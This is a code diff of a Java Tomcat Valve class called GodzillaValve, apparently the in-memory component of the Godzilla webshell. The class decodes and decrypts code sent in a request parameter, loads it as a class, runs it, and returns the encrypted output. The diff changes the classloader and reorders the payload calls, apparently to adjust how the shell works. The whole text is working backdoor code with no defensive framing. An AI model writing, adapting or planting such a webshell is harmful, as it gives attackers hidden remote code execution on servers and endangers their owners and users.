@@ -111,16 +111,15 @@ public class GodzillaValve extends ClassLoader implements Valve {
                 byte[] data = base64Decode(request.getParameter(pass));
                 data = this.x(data, false);
                 if (session.getAttribute("payload") == null) {
-                    session.setAttribute("payload", (new GodzillaValve(this.getClass().getClassLoader())).Q(data));
+                    session.setAttribute("payload", (new GodzillaValve(Thread.currentThread().getContextClassLoader())).Q(data));
                 } else {
-                    request.setAttribute("parameters", data);
                     ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                     Object f = ((Class) session.getAttribute("payload")).newInstance();
                     f.equals(arrOut);
-                    f.equals(data);
                     f.equals(request);
-                    response.getWriter().write(md5.substring(0, 16));
+                    f.equals(data);
                     f.toString();
+                    response.getWriter().write(md5.substring(0, 16));
                     response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
                     response.getWriter().write(md5.substring(16));
                     response.flushBuffer();
